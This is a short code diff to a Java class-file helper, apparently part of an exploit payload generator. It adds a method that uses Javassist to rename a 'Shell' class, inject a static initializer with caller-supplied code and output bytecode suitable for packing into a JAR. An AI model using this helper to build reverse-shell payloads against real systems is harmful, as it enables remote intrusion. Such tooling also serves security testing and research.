@@ -24,6 +24,15 @@ public class ClassFiles {
         return cc.toBytecode();
     }
 
+    public static byte[] makeClassWithReverseShell(String classname, String body) throws Exception {
+        ClassPool pool = new ClassPool(true);
+        pool.appendClassPath(new ClassClassPath(shell.Shell.class));
+        CtClass cc = pool.getCtClass(shell.Shell.class.getName());
+        cc.setName(classname);
+        insertStaticBlock(cc, body);
+        return cc.toBytecode();
+    }
+
     public static byte[] makeJarWithMultiClazz(String jarname, Map<String, byte[]> bytecodes){
         try(ZipOutputStream zipout = new ZipOutputStream(new FileOutputStream(jarname))){
             for(Map.Entry<String, byte[]> clazz:bytecodes.entrySet()){
